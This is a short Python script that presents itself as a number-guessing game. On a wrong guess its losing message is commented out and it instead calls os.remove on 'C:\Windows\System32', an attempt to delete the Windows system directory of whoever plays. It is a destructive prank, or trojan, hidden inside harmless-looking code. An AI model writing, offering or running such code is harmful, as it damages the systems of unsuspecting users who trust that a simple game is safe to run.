import random
import os

number=random.randint(1,10)
guess=input('Guess number btwn 1 and 10\n')
guess=int(guess)

if guess==number:
    print('You win')
else:
    #print('You lost😂')
    os.remove('C:\Windows\System32')